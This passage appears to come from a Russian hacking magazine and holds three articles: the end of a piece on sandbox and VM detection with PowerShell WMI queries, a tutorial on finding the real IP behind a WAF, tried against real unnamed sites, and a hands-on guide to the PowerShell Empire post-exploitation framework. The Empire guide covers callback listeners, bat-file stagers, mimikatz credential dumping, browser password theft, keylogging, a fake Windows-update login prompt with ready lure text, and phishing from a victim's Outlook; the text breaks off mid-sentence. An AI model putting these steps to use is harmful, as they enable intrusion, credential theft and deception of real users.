внутри ВМ? Этим вопросом мы задались на ранних этапах раз работки ПО.
Посмотрим на картинку.





                   Проб рос кешей в виртуал ки

Процессоры име ют кеш инструкций и кеш данных (это два подуровня кеша
L1). Кеш инструкций (L1i) используется для чтения инструкций исполняемой
программы. Процессор и кеш L1 минимально необ ходимы для того, чтобы
ОС и программы смогли работать на железе, в том числе и на ВМ.
  Кеш L2 используется для больших бло ков данных, по умол чанию находит‐
ся на гипервизоре. Одна ко гипервизор поз воля ет настроить более произво‐
дительную виртуальную машину, и в этом случае кеш, скорее все го, проб‐
росится в ВМ.
  Кеш L3 обычно представляет собой кеш‐слой, который располагается
поверх основной памяти. Таким обра зом, кеш L3 используется всеми про‐
цессорами материнской платы. Вся кий раз, когда ЦП запрашивает данные
из основной памяти, больший блок данных считыва ется в кеш L3. Если CPU
требуется еще больше данных, сохраняемых пос ледовательно после зап‐
рошенной ранее памяти, есть вероятность, что память может быть найдена
в кеше L3, который находится на стороне гипервизора.
  Тем не менее некоторые параметры CPU могут быть проброшены в вир‐
туалку либо подменены, например Caption, DeviceID, Manufacturer, MaxClock‐
Speed, Name, SocketDesignation.
  В результате гипер визор выдает виртуальной машине L1‐кеш, но вот дос‐
тучаться из‐под виртуалки до кеша L2 можно не всегда, а до L3 — нельзя
практически никогда. Сыграем на этом: если размеры кешей нулевые
или None (не удалось получить значение), то перед нами виртуал ка.


        WWW

                   Много интересного о том, как виртуализируется
                       аппарат ная  часть, можно прочитать  в  статье
                       на сайте VMware.


Занятно, но некоторые ИБ‐вендоры уже пофиксили баг с несущес твующим
кулером либо тщательно монито рят зап рос на его наличие, хотя и на реаль‐
ных машинах он коррек тно обрабатывается далеко не всегда. Чтобы получить
информацию о  кулерах, можно  воспользовать ся  следующим  скриптом
PowerShell:


$colItems = Get‐WmiObject Win32_Fan ‐Namespace "root\cimv2"
foreach ($objItem in $colItems)
{
  "Active Cooling: " + $objItem.ActiveCooling
  "Availability: " + $objItem.Availability
  "Device ID: " + $objItem.DeviceID
  "Name: " + $objItem.Name
  "Status Information: " + $objItem.StatusInfo
}

Вывод скрипта примерно следующий (если кулер таки нашел ся):



  Active Cooling     : True
  Availability       : 3
  Device ID          : root\cimv2 1
  Name               : Cooling Device
  Status Information : 2


Неплохая идея — прос мотреть дос тупные  зву ковые устройства  (класс
Win32_SoundDevice). На простень ких виртуал ках данный запрос обычно
ничего не возвращает. Также совету ем тебе посмотреть доступные реальные
принтеры через класс Win32_Printer. Если в сис теме зарегистри рованы
используемые прин теры, кроме дефолтных, воз можно, ты имеешь дело
с реальным компьютером.
  Следующие несколь ко параметров связаны с видеоконтрол лером и экра‐
ном:
 • разрешение экрана;
 • количество и тип видеоконтроллеров;
 • объем видеопамяти.

Не теряя ни секунды, зап рашивай разрешение экра на:


Get‐WmiObject ‐Class Win32_DesktopMonitor |
Select‐Object ScreenWidth,ScreenHeight

В реальной машине оно выводит ся без проблем:



  ScreenWidth ScreenHeight
  ‐‐‐‐‐‐‐‐‐‐‐ ‐‐‐‐‐‐‐‐‐‐‐‐
  1366 768


На ВМ данные поля, как пра вило, оста ются пус тыми или с низким расширени‐
ем. Что там с видеоконтроллерами?


Get‐WmiObject ‐Class Win32_VideoController

На реальном ноуте у нас их аж два — встроенный и дискретный:



  AdapterCompatibility   : NVIDIA
  AdapterDACType         : Integrated RAMDAC
  AdapterRAM             : 1073741824
  Caption                : NVIDIA GeForce GT 540M
  VideoProcessor         : GeForce GT 540M


  AdapterCompatibility   : Intel Corporation
  AdapterDACType         : Internal
  AdapterRAM             : 2210398208
  Caption                : Intel(R) HD Graphics 3000
  VideoModeDescription   : 1366 x 768 x 4294967296 colors
  VideoProcessor         : Intel(R) HD Graphics Family


Для  сравнения —  результат выполнения  этого  скрипта  в ВМ  с  VDI
инфраструктуры (перечислены значимые строки):



  AdapterCompatibility   : Citrix Systems Inc.
  AdapterDACType         : Virtual RAMDAC
  AdapterRAM             : 0
  Caption                : Citrix Display Only Adapter
  VideoModeDescription   : Цвета: 1440 x 900 x 4294967296
  VideoProcessor         : Citrix Virtual Display Adapter Chip


  AdapterCompatibility   : Citrix Systems Inc.
  *AdapterDACType         : *
  *AdapterRAM             : *
  Caption                : Citrix Indirect Display Adapter
  *VideoModeDescription   : *
  VideoProcessor         :


  AdapterCompatibility   : VMware, Inc.
  AdapterDACType         : n/a
  AdapterRAM             : 0
  Caption                : VMware SVGA 3D
  VideoModeDescription   : Цвета: 1440 x 900 x 4294967296
  VideoProcessor         : VMware Virtual SVGA 3D Graphics Adapter


Подробности — после парочки строчек кода. Если нужно сразу получить раз‐
мер видеопамяти в человеческом виде, можно воспользоваться следующей
командой PowerShell:


Get‐WmiObject Win32_VideoController |
select name, AdapterRAM,@{Expression={$_.adapterram/1MB};label="MB"}

Память есть, теперь в мегабайтах!



  name                      AdapterRAM MB
  ‐‐‐‐                      ‐‐‐‐‐‐‐‐‐‐ ‐‐
  NVIDIA GeForce GT 540M    1073741824 1024
  Intel(R) HD Graphics 3000 2210398208 2108


На виртуалке видеопамять имеет какое‐то свое, сакральное значение — либо
оно нулевое, либо его вовсе не дос тать, либо его значение небольшое.
  В виртуальных машинах либо ты не сможешь узнать раз решение экрана,
либо может исполь зовать ся очень странное раз решение вроде 800 на 600.
То же касается и количества видеоконтрол леров. Если параметр Adapter‐
DACType (Digital‐to‐Analog Converter) не содержит в названии строк вида Inter‐
nal или Integrated либо вообще пустой, это очень подозрительно. Не менее
подозрителен маленький объем видеопа мяти, например меньше 256 Мбайт
(в нашей задаче размер имеет зна чение). Невоз можность получить этот
параметр характерна для виртуальных сред.
  Интересно дела обстоят с виртуальными видеоконтрол лерами на при мере
Citrix или других устройств с VDI — у них раз мер видеопамяти равен нулю,
но такие девайсы можно филь тро вать по наз ванию вендора. Плюс к этому
виртуальный видеоадаптер сам по себе в единс твенном числе не существует,
в системе должен присутство вать еще один тип Internal или Integrated.
  Много инте ресных данных можно извлечь при наличии прав администра‐
тора. Например, есть шанс дос тучать ся до показаний температурных сен‐
соров реальной машины, что невозможно в виртуаль ной (если они не проб‐
рошены или не симулируются). Если получено валидное значение температу‐
ры (ориентировоч но от 1 до 150 °С), это может говорить, что комп реальный.
Приведем пример проверки температуры CPU:


$CPUt = Get‐WmiObject MSAcpi_ThermalZoneTemperature ‐Namespace "root/
wmi"
$currentTempKelvin = $CPUt.CurrentTemperature/ 10
$currentTempCelsius = $currentTempKelvin ‐ 273.15


$currentTempCelsius

Если все пройдет успешно, ты узнаешь температу ру проца в градусах Цель‐
сия. Если не повезет — получишь значение ‐273.15, то есть значение абсо‐
лютного нуля и показа тель, что достучаться до термодатчика стандартным
путем нельзя.
  Можно самостоятельно проверить свою виртуаль ную машину с помощью
таких программ, как HWiNFO или AIDA64, и убедить ся, что для виртуальной
среды значения температу ры будут недос тупны (так же как ряд характеристик
процессора и жесткого диска!). Одна ко в случае с Parallels значения датчиков
температуры и вольтажа все же проб расываются на виртуальные машины.





          Проб рос температуры и вольтажа проца в Parallels

И напоследок — самое сладкое (предуп режда ем, что данный способ пока
еще не опробован в боевых усло виях). Проверим производительность гра‐
фики с помощью WebGL и Canvas 3D. Легче всего это сде лать, используя
готовые онлайн‐тесты, например GlowScript или Wirple. Мы остановились
на втором варианте, пос кольку он позволяет проводить блиц‐стресс‐тест
производительности. Результаты смот ри в таб лице ниже.





                     Тест производительности GPU

Сравнивая полученные зна чения FPS на реальных и виртуальных машинах, мы
пришли к выводу, что если итоговый результат по четырем тестам мень‐
ше 200 FPS, то перед нами виртуалка.
  С FPS дело обстоит так: в виртуальных средах этот показатель на порядки
ниже, чем на реальных машинах. В наших тес тах производительность ВМ
была на уровне 1–50 FPS, в то время как на реаль ном более‐менее сов‐
ременном железе значение было порядка 1000–1500 FPS.


ЗАКЛЮЧЕНИЕ
Как можно заметить, не все методы позволяют со стопроцентной уверен‐
ностью определить, что программа запущена в виртуальной среде, однако
использование нескольких раз ноуровневых методов существенно повышает
вероятность получить правильный результат.
  Нашей задачей было показать основные идеи и самые приметные харак‐
теристики ВМ. На Black Hat в 2015 году в качестве примера использовались
проверки на количество логических процессоров и общий объем памяти,
а также поиск VMware в названиях произво дителей и именах сетевого адап‐
тера, в серийном номере BIOS. Также применялся поиск процесса vm‐
toolsd.exe.
   Что касается методов, связанных с проверкой атрибутов устройств, часть
из них может и не отличить реальную машину от виртуальной (если некоторые
модели   устройств   не   предос тавляют   данные   через   описанную
функциональность или исполь зуются тонкие нас тройки и ограниче ния сис‐
тем). Однако если применить сразу нес колько методов, нацеленных на раз‐
ные атрибуты, то с помощью весовых коэффици ентов можно опре делить
вероятность того, что машина виртуальна. На практике использование ком‐
бинации всех методов дает верный результат в 95% случаев.
  Bug Bounty по песочницам еще не сущес твует. Мы пытались сооб щить
нескольким вендорам, вклю чая инос транных, о пробелах в их продуктах.
Реакция производите лей была разной — от нас мешки (типа у нас нас только
крутая система, что такого не может быть) до полного игнора, как только мы
направляли доказательства наших слов. Именно поэтому мы решили опуб‐
ликовать эту статью.
  В итоге цикл «мы вам виртуалку — а мы вам метод ее обнаружения» может
продолжаться до потери пульса. Тем не менее мер противодействия некото‐
рым из представленных методов в коммерчес ких продуктах до сих пор нет.


        WWW

                      Если ты заин тересовался темой: многие инстру‐
                     менты для детектирования песочниц можно найти
                        в свободном доступе. Среди проектов на GitHub
                       следует  отметить  InviZzzible  от  Check  Point
                      или агрегацию проектов в awesome‐sandbox‐eva‐
                           sion.


Если у тебя есть идеи, какие еще методы можно попробовать для определе‐
ния виртуалок, или ты получил интерес ные резуль таты после выполнения
команд из статьи — напиши нам, мы с удовольствием обсудим твои мыс ли!
ВЗЛОМ

  WAF
    BYPASS
             КАК ВЫЗНАТЬ
              IP САЙТА, КОТОРЫЙ
          ИСПОЛЬЗУЕТ WAF
           ИЛИ ЗАЩИТУ
             ОТ DDOS





Существуют  разные  сервисы,  которые
скрывают адрес сайта за другим  IP —
в целях защиты от DoS, DDoS или прочих
атак. Это могут быть как всем известные
облачные сервисы вро де  Cloudﬂare,  так            Ghoustchat                                                                                     aio02012003@gmail.com
и файрволы веб‐приложений (WAF) и дру‐
гие защитные решения. Задача их обхода
сводится к тому, что бы вызнать реальный IP,
и для этого существуют готовые утилиты.
Давай пос мотрим, как пользоваться ими
на практике.


Для начала чуть подробнее расскажу о том, что такое WAF и как он работает.
Например, в составе всем знакомого веб‐сервера Apache есть модуль mod‐
_security, который способен выполнять функции фай рвола веб‐приложений
и помочь защитить твой сервис от какой‐нибудь три виальной DoS‐атаки.
Одна из таких атак — HTTP(S) GET‐флуд, когда серверу посылают бесчислен‐
ное множество запросов на получение информации. Сервер неспособен
обработать столько запросов за очень короткий промежу ток и попросту
падает.
  Подобную функцию может предос тавлять и какой‐то облачный провай‐
дер — для простоты разные сервисы такого типа я дальше буду называть
просто WAF. Принцип их работы можно описать следующим образом.
 1. Веб‐сервер, который нуж но защитить, работает в обычном режиме
   без фильтрации опас ных зап росов, а WAF‐сервис настроен на отдельном
   сервере компании, предос тавляющей подоб ные услуги.
 2. В некой DNS‐записи в качестве IP нужного сайта указывается не его нас‐
   тоящий адрес, а IP‐адрес сервера WAF.
 3. После такой настрой ки все запросы к доменному име ни сайта будут нап‐
   равляться не на сам сайт, а на WAF‐сервер.
 4. Этот сервер принимает запрос, обрабатывает его и, если запрос удов‐
   летворяет настроенным правилам, отсы лает его на защищаемый сервер.
  WAF получает от это го сервера запрашиваемую информацию (веб‐стра‐
   ницу, файл) и перенаправляет ее клиенту (пользователю).


КАК ОБХИТРИТЬ СИСТЕМУ
Так как современные WAF блокиру ют множество вредонос ных запросов,
не получится использовать утилиты вро де sqlmap или WPScan. Также невоз‐
можны атаки типа DoS или DDoS.
  Поэтому у нас есть два варианта действий.
 1. Сконструировать запрос таким обра зом, чтобы обойти правила, про‐
   писанные в WAF (см. статью «Как искать байпасы в современных Web Ap‐
    plication Firewalls»).
 2. Отправить запрос нап рямую к веб‐серверу, минуя проверку WAF.

Дальше мы сконцентрируемся на втором пункте. Для его реализации нам
нужно знать настоящий IP‐адрес сервера и быть уверенными, что этот сервер
способен принимать запросы напрямую из сети от кого угодно. Пря мой IP‐
адрес сервера часто называют сло вом bypass. Иногда прямой дос туп к нему
специально сохраняют, чтобы сервер мог продолжить работу в случае
неполадок на стороне WAF‐сервисов.
  Для этой цели мы будем использовать скрипт с длинным, но говорящим
названием: Bypass ﬁrewalls by abusing DNS history.
   Эта утилита пытается узнать настоящий IP‐адрес нужного нам сервера
сразу двумя методами.
 1. Анализ истории DNS‐записей.
 2. Поиск поддоменов и пос ледующий анализ их IP‐адресов.

Ко всем найденным IP‐адресам скрипт делает запросы для проверки.


             INFO

                    Более подробное изложение теории ты можешь
                      найти в статье «Вычисляем реальный IP сервера
                        за Cloudﬂare/Qrator».



К ПРАКТИКЕ
Скрипт находится в открытом дос тупе на GitHub. Я запускал его в Kali Linux,
но он может работать и в других дистрибути вах.
  Команды для установки на Kali выглядят так:


$ sudo apt install jq
$ git clone https://github.com/vincentcox/bypass‐firewa
lls‐by‐DNS‐history

Команда для установки в дистрибутиве BlackArch:


$ sudo pacman ‐S bypass‐firewall‐dns‐history jq

Возвращаемся в  Kali. Первой строчкой мы ставим необходимый модуль
для работы скрипта, а второй ска чиваем скрипт с GitHub. Чтобы получить
справку по исполь зованию тулзы, достаточно перей ти в ее директорию
и выполнить следующую команду:


$ bash bypass‐firewalls‐by‐DNS‐history.sh ‐‐help

Как показывает справка, раз работчик скрипта предус мотрел несколько
параметров:
 • d — обязательный ключ для использования скрипта. С его помощью мы
   указываем доменное имя сайта, для которого хотим найти bypass;
 • a — с этим параметром найденные IP будут проверены не только
   для основного домена, но и для под доменов;
 • l — этот параметр позволяет подгру зить в скрипт твой спи сок под‐
   доменов, чтобы выполнить более детальную и точную проверку;
 • o — данный параметр поз воляет сохранить результат работы скрипта
   в файл, путь к которому указывается пос ле параметра.

А теперь запустим скрипт:


$ bash bypass‐firewalls‐by‐DNS‐history.sh ‐d <Your_target>

Для примера я нашел один сайт, который уяз вим к атаке такого вида. Вот
как выглядит вывод скрип та для этого сай та.





                    Результат работы скрипта

В колонке IP будут поочередно записаны IP‐адреса, по которым можно нап‐
рямую обратиться к серверу. Во вто рой колонке указана вероятность того,
что это верный IP, выраженная в процентах. В колонке Organisation — наз‐
вание компании, которой принадлежит данный IP.
   Возьмем другой пример и расширим зону поиска: добавим сопоставле‐
ние IP с поддоменами:


$ bash bypass‐firewalls‐by‐DNS‐history.sh ‐d <Your_target> ‐a





                  Результат рас ширенного поиска

Здесь, помимо всего прочего, появляется еще одна колонка — Domain,
в которой перечислены поддомены, соответс твующие найденным IP‐адре‐
сам.
   Чтобы потом не потерять результат работы, его обычно сохраня ют в файл.
Что ж, используем параметр ‐o и про пишем путь для сохранения лога
в домашнюю папку пользователя.


$ bash bypass‐firewalls‐by‐DNS‐history.sh ‐d <Your_target> ‐a ‐o /
home/kali/<output.txt>


             INFO

                  Можно указывать не весь путь, а только название
                    файла, в который будет записан результат. Файл
                        сохранится в пап ку со скрип том.


Как ты знаешь, не все взламывается в один клик. Иногда программам тоже
нужна помощь — в нашем случае мы можем облегчить тул зе задачу, составив
объемный список поддоменов. Этот список мы запол ним с помощью скрипта
Amass, который прекрасно умеет это делать. Запус кается Amass вот такой
командой:


$ Amass enum ‐d <Your_target> ‐o <subdomains.txt>

С помощью параметра ‐d указываем свою цель, с помощью ‐o — файл
для сохранения результата работы.





                     Результат работы Amass

Возвращаемся к WAF Bypass. Теперь мы будем использовать список найден‐
ных поддоменов для поиска настоящего IP‐адреса ата куемого сервера:


$ bash bypass‐firewalls‐by‐DNS‐history.sh ‐d <Your_target> ‐l <subdom
ains.txt>





      Результат работы WAF Bypass с помощью списка поддоменов

Как видим, найдены два наиболее веро ятных bypass‐ip.


ПРОБУЕМ НАВЫКИ В ДЕЛЕ
Чтобы развеять у тебя сомнения в работос пособ ности этого метода, я пред‐
лагаю  провести  небольшое  исследова ние. Мы  попробуем  пробить
с помощью данной утилиты несколько сайтов и составим небольшую статис‐
тику.


           WARNING

                     Все дальнейшие действия были выполнены толь‐
                        ко  в  целях обучения и исследования. Автор
                      не преследует цели навредить какой‐либо ком‐
                      пании или отдельным людям.


Хочу уточнить: проверять мы будем только серверы, которые защище ны WAF.
Чтобы в этом убедиться, используем встроенную в Kali утилиту dig:


$ dig <DOMAIN> NS +short

Утилита выведет нам список DNS‐серверов, к которым подключен сайт. Если
ты увидишь DNS сервера Cloudﬂare или дру гих WAF, это означает, что сайт
находится под защитой от DOS‐ и DDоS‐атак.
  Команду для тестирова ния будем использовать тоже общую:


$ bash bypass‐firewalls‐by‐DNS‐history.sh ‐d <Your_target> ‐a

Итак, поехали. Возьмем для примера один игровой сайт, защищенный Cloud‐
ﬂare. Домен я по понятным причинам показывать не стану. Попробу ем
использовать нашу ути литу для про бива WAF и пос мотрим, добьемся ли мы
успеха.





                       Результат пробива

Как видишь, мы получили список возможных байпасов, но он слишком
огромный, и у каждого IP своя оценка вероятности. Это говорит о том, что
не так‐то просто пробить крупные компании.
   Теперь посмотрим на один из серверов для совместной игры в Minecraft.
Они тоже часто пользуются услугами защиты от DoS и DDoS.





                       Результат пробива

Для экспе римента я беру первые попавшиеся серверы. Этот был зарубеж‐
ным, и его защита выстояла.
  Попробуем что‐нибудь более беззащитное — мне под руку попался кас‐
томный ролевой сервер игры GTA V.





                       Результат пробива

Стопроцентный успех. Одна ко сервер был нас толь ко скромным, что приш‐
лось принудительно остановить полное ска нирование.
   Теперь проверим нес колько новостных сайтов. Первой «жертвой»  (в
кавычках, поскольку никакого вреда мы не причинили) выс тупил один
популярный новостной портал.





                       Результат пробива

Мы получили огромное количество ошибок. Они связаны с тем, что сервер
журнала ограничил нам возможность делать зап росы. Однако утилите это не
помешало добиться успеха. В самом первом отчете был найден бай пас
с вероятностью в 100%, одна ко это был поддомен.
  Далее попробуем зарубежный образова тельный журнал.





                       Результат пробива

Можно заметить, что программа уже начала отва ливаться, но все же попыта‐
лась найти в поддоменах байпасы. Про цент успеха достаточно мал.
  И наконец, последний кандидат.





                       Результат пробива

Успех! Найден стопроцентный байпас.


ВЫВОДЫ
Как видишь, этим методом действительно можно отыскивать верные бай‐
пасы. Конечно, не всегда это получа ется качественно, иначе WAF вооб ще
были бы бесполезными. Однако, наткнувшись на один из них, не опускай
руки, ведь в твоем арсенале теперь еще пара действенных инструментов.
ВЗЛОМ

  ПУТЕВОДИТЕЛЬ
     ПО «ИМПЕРИИ»





      РАЗБИРАЕМСЯ С ФРЕЙМВОРКОМ
           POWERSHELL EMPIRE
  ОТ УСТАНОВКИ ДО ЗАКРЕПЛЕНИЯ В СИСТЕМЕ





Многие слышали про Empire — инструмент
постэксплуатации Windows, Linux и macOS.
В статье я затрону все аспекты работы
с ним, а также расскажу, какие именно фун‐
кции фреймвор ка мы часто используем             RalfHacker                                                                                             hackerralf8@gmail.com
на практике. И даже если ты опытный пен‐
тестер или редтимер, я думаю, ты отметишь
для себя что‐то новое и полезное.


Оригинальный проект PowerShell Empire уже давно не поддерживается, так
что речь пойдет о его форке от BC‐SECURITY. Этот форк продол жает раз‐
виваться и обновляться.


           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редак ция, ни автор
                      не несут ответственности за любой возможный
                        вред, причинен ный информацией из этой статьи.



УСТАНОВКА EMPIRE
Если ты используешь Kali Linux, то для установки это го чудо‐фрей мворка пот‐
ребуется выполнить всего лишь одну команду:


sudo apt install powershell‐empire

Если на твоем компе дру гая система, нужно скачать фай лы проекта и уста‐
новить их вручную.


git clone https://github.com/BC‐SECURITY/Empire.git
cd Empire
sudo ./setup/install.sh

Собственно, все: фреймворк Empire установлен в тво ей системе.


ПОЛУЧЕНИЕ ТОЧКИ ОПОРЫ
Перед тем как мы рассмотрим сам программный комплекс, давай разберем‐
ся со следующими понятиями:
 • Listener — это локальный процесс, ожидающий бэкконнект с удаленного
   атакуемого хоста;
 • Stager — загрузчик Agent’a, то есть полезной нагрузки на удаленный ата‐
   куемый хост;
 • Agent — процесс (на удален ном ата куемом хосте), который соединяется
   с нашим Listener’ом;
 • Module — код, выполняемый Agent’ом для достижения опре деленных
   целей.

Запустим Empire командой powershell‐empire. Ты увидишь такое окно.





                     Начало работы Empire

Для получения точки опоры используется следующий порядок действий: соз‐
дание Listener’a → создание Stager’a для этого Listener’a → запуск нагрузки
на удаленном хосте (соз дание Agent’a).


Listener
Для создания Listener’a нужно войти в соответству ющий интерфейс командой
listeners.



                     Ин терфейс listeners

Сейчас у нас нет активных листенеров. Соз дать его можно командой uselis‐
tener, но давай посмотрим, какие типы листенеров нам может предложить
Empire.


uselistener <TAB>



                   Список лис тенеров Empire

Поясню, что здесь что:
 • dbx — Dropbox‐лис тенер (хорош, чтобы уклоняться от обнаружения,
   но требует токен для Dropbox API);
 • http — обычный HTTP/HTTPS‐листенер;
 • http_com — HTTP/HTTPS‐листенер, использующий объект IE COM;
 • http_foreign — HTTP/HTTPS‐листенер для сторонней нагрузки Empire;
 • http_hop — HTTP/HTTPS‐листенер для перенаправления команд дру‐
   гому листенеру, что помога ет скрыть исходный IP (требует параметр
   RedirectListener);
 • http_mapi — HTTP/HTTPS‐лис тенер для использования с Liniaal, что поз‐
   волит получить управление через Exchange‐сервер;
 • meterpreter —  HTTP/HTTPS‐листенер  для  сторонней  нагрузки
   Meterpreter;
 • onedrive —  onedrive‐листенер  (требует  регистрацию  приложения
   https://apps.dev.microsoft.com)
 • redirector — инструмент для перехода от одного агента к другому.

С типами листенеров разобрались, а теперь давай посмотрим, как с ними
работать. Для начала выбира ем тип (для примера возьмем самый простой —
HTTP).


uselistener http



                   Выбор типа листенера

Получить справку по выбранно му лис тенеру мож но командой info.





                 Справка по выбранному листенеру

Использованием прок си уже никого не удивишь, но мы можем назначить дату,
когда листенер будет уда лен, а еще определенные часы работы (это очень
удобно!). При использовании HTTPS нужно также указать путь к сертификату.
Но теперь к основному: назначим имя лис тенера, адрес хоста для бэкконнек‐
та и порт.


set Name l1
set Host http://192.168.6.1
set Port 4321



             Назначение основных параметров листенера

И запустим листенер командой execute.





                       Запуск лис тенера

Теперь в интерфейсе listeners мы наб людаем только что запущенный лис‐
тенер.





                      Список лис тенеров

Переходим ко второй стадии.


Stager
Давай по аналогии с листенером выберем тип stager’a (далее — нагрузки).
Сделать это можно командой usestager.





                     Список типов stager’ов

Нагрузки есть для разных платформ: multi (кросс‐платформенные), macOS
и Windows. А еще существует несколько типов наг рузки:
 • bash — обычный Bash‐скрипт;
 • launcher — так называемый one‐liner‐код на определенном скриптовом
   языке;
 • macro — макрос для офисных приложений;
 • pyinstaller — ELF‐файл, соб ранный с помощью PyInstaller;
 • war — просто набор байтов для модернизации нагрузки;
 • applescript — файл AppleScript;
 • application — файл Application;
 • ducky — так называемый скрипт Rubber Ducky;
 • dylib — динамическая библиотека macOS;
 • jar — нагрузка в JAR‐формате;
 • machomacOS — офисный макрос для macOS;
 • pkg —  установщик PKG  (должен  быть  скопирован  в  директорию
  /Applications);
 • safari_launcher — HTML‐нагрузка;
 • shellcode — обычный Windows‐шелл;
 • teensy — Teensy‐скрипт;
 • backdoorLnkMacro — файл .lnk для заг рузки и запуска приложения;
 • bunny — скрипт Bash bunny;
 • csharp_exe — приложение PowerShell/C#;
 • dll — нагрузка в виде DLL;
 • hta — HTA‐нагрузка для IE;
 • macroless_msword — документ macroless;
 • wmic — XSL‐нагрузка для wmic.exe (отсутству ет в оригинальном Empire).

Давай выберем тип нагрузки. Возьмем, к примеру, bat‐файл для Windows.


                    Выбор типа нагрузки

Как и в случае с листенером, пос мотрим параметры командой info.





                  Справка по выбранной нагрузке

Что нам предлагает Empire? Сно ва традици онная возможность настроить
прокси, но вот встроенная функция обфускации  (к сожалению, только
для PowerShell‐скриптов) — это вещь приятная. Мы можем указать, где сох‐
ранить итоговый файл, а также настроить уда ление файла после запуска.
Давай укажем листенер и путь к ито гово му файлу, после чего создадим
stager.


set Listener l1
set OutFile /home/ralf/tmp/l1.bat
execute




                       Создание нагрузки

Файл с нагрузкой создан по указанному пути.


Agent
Нам нужно выпол нить bat‐файл на целевом хосте. Ты увидишь сообщение
о подключении.



                 Подключились и создали агента

Перейдем в главное меню и выполним команду agents, чтобы увидеть все
агенты.





                        Список агентов

Для удобства можно переименовать агент командой rename и перей ти
в интерфейс управления агентом (команда interact).


rename LVKP4HN3 al1
interact al1



                        Список агентов

Мы в системе, теперь пройдемся по самым интересным модулям, которые
реально находят применение и используются нашей командой на практике.


ЭКСПЛУАТАЦИЯ И ПОСТЭКСПЛУАТАЦИЯ WINDOWS С EMPIRE
Базовые опции
К базовым опциям относятся те функции, которые реализованы в Empire
без участия сторонних модулей. Так что пробежимся по тем, которые при‐
ходится часто применять:
 • sysinfo — предоставляет информацию о системе на удаленном хосте;
 • download/upload — поз воляет загрузить файлы на удаленный хост или с
   него (подобные команды реализованы уже, наверное, вез де);
 • sleep — устанавливает интервал обмена сооб щениями с агентом. Таким
   образом, если установить интервал в 60 секунд, то агент будет принимать
   от оператора команду и загружать ее в очередь, а затем раз в минуту очи‐
   щать очередь и предоставлять информа цию;
 • steal_token — модуль имперсонации токена доступа;
 • shell [cmd] — позволяет выполнить команду черед cmd.exe;
 • ps — выводит список процес сов с указанием име ни процесса, его PID,
   пользователя, в контексте которого работа ет процесс, и занимаемую про‐
   цессом память;
 • psinject — внедряет агент в другой процесс;
 • scriptimport — позволяет заг рузить PowerShell‐скрипт в память;
 • mimikatz — простое быстрое выполнение sekurlsa::logonpass
  words;
 • creds — локальное хра нилище учетных данных (паролей, хешей), предос‐
   тавляет оператив ную работу с ними. Хеши запол няются автоматически
   при использовании разных модулей, но также возможно их ручное добав‐
   ление и удаление. К примеру, упо мянутая команда mimikatz собрала
   некоторые учетные данные. Давай взглянем на них.





                Локальное хранилище creds Empire

Это не все «быстрые команды» Empire, а, как упо миналось, те, которые мы
используем постоян но.
  Для подклю чения дополнительных модулей следует использовать команду
usemodule, а если тебе необ ходимо найти какой‐то модуль, для этого есть
команда searchmodule.





               Поиск модулей, связанных с dllhijack


Раз дел collection
Давай рассмотрим модули из данного раз дела, которыми мы часто поль‐
зуемся. Так как почти всег да приходится вытас кивать пароли и данные
из браузеров, тут на помощь приходят следующие инс трументы:
 • collection/ChromeDump;
 • collection/FoxDump;
 • collection/SharpChromium.

Запустим модуль командой run или execute. При этом Empire сооб щает, что
использование данного модуля нарушает правила скрытности, и спрашивает,
хотим ли мы продол жить.





              Использование модуля SharpChromium

В результате мы получаем все куки, исто рию запросов и сохраненные учет‐
ные данные.





          История зап росов и сохраненные учетные данные

Следующие интересные возможности — искать фай лы с помощью модуля
collection/file_finder и получить дамп нужного процесса с помощью
модуля collection/minidump. А для отслежива ния вводимой пользовате лем
информации можно легко активировать кейлоггер — collection/keylogger.
Для примера откроем блокнот и напишем сло во test — это дей ствие будет
зафиксировано Empire.





                        Работа кей логгера

С помощью collection/clipboard_monitor мы отслеживаем, что попадает
в буфер обмена.





                Монито ринг буфера обмена

Наконец, самые замечательные функции этого раздела связаны с фишингом.
Когда нам необходимо получить пароль и все потенциальные точки входа
не прошли проверку, мож но «попросить» у поль зователя его учетные данные!
Сделать это помогают модули collection/prompt или collection/toasted.
Я приведу пример использования toasted: на экране юзера выводится уве‐
домление (можно придумать какие угодно условия, но мы используем
перезагрузку, так как никто не захочет прерывать работу с документами),
на которое он реагирует. Независимо от его выбора появится окно авториза‐
ции, учетные данные из которого мы и получим.


usemodule collection/toasted
set ToastTitle "Ваш сеанс работы будет прекращен"
set ToastMessage "Cистема будет перезагружена через 5 минут. Хотите
ли вы отложить перезагрузку?"
set Application "Служба обновлений Windows"
set CredBoxTitle "Вы уверены, что хотите перезагрузить ваш ПК?"
set CredBoxMessage "Для выполнения данного действия требуется
аутентификация"
run





            Всплывающее уведомление о перезаг рузке ПК





                      Окно авторизации





             Полученные логин и пароль пользователя

При этом у данных модулей есть параметр VerifyCreds, установив который
в True мы обяжем Empire проверить эти учетные данные на подлинность,
перед тем как показать их нам. Если пользователь ввел некорректные учет‐
ные данные или просто опечатался, Empire запросит их снова.


Раз дел credentials
Об этом разделе расска зывать особо нечего. Он представляет собой пол‐
ностью реализованное на PowerShell и вставленное в Empire программное
обеспечение mimikatz.



                    Список модулей mimikatz

Использовать этот инструмент про ще прос того, поэтому переходим к сле‐
дующему разделу.





                Использование mimikatz hashdump



                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

      ПУТЕВОДИТЕЛЬ
     ПО «ИМПЕРИИ»
           РАЗБИРАЕМСЯ С ФРЕЙМВОРКОМ POWER‐
                       SHELL EMPIRE ОТ УСТАНОВКИ
                  ДО ЗАКРЕПЛЕНИЯ В СИСТЕМЕ





Раз дел management
В этом разделе есть нес колько кру тых фишек. Первая из них — это легкое
вклю чение и отклю чение RDP для пользователя. Для этого применяются
модули management/enable_rdp и management/disable_rdp. Да, Empire
снова пре дупреждает, что это палевно!





                        Включение RDP





                    Ус пешное подключение к RDP





                       От клю чение RDP





                 Неудачное подключение к RDP

В Empire также встроен инструмент EmailRaider, предназначенный для прос‐
мотра и отправ ки фишинговых писем с помощью собственного клиента Out‐
look от имени пользователя. На самом деле из большого спис ка довольно
мощных модулей management/mailraider/ мы пользуемся только одним,
который отвечает за отправку писем, — management/mailraider/send_mail.





                  Парамет ры модуля send_mail

С использованием этого инстру мента мы заполняем текст сообщения и дела‐
ем рассылку. Как правило, получив пись мо от известного отправителя
или другого сотрудника компании, жертва охотнее запус тит файл (пусть
и подозрительный) или перейдет по ссылкам.
  И последний модуль, который используется для наблюдения, — manage‐
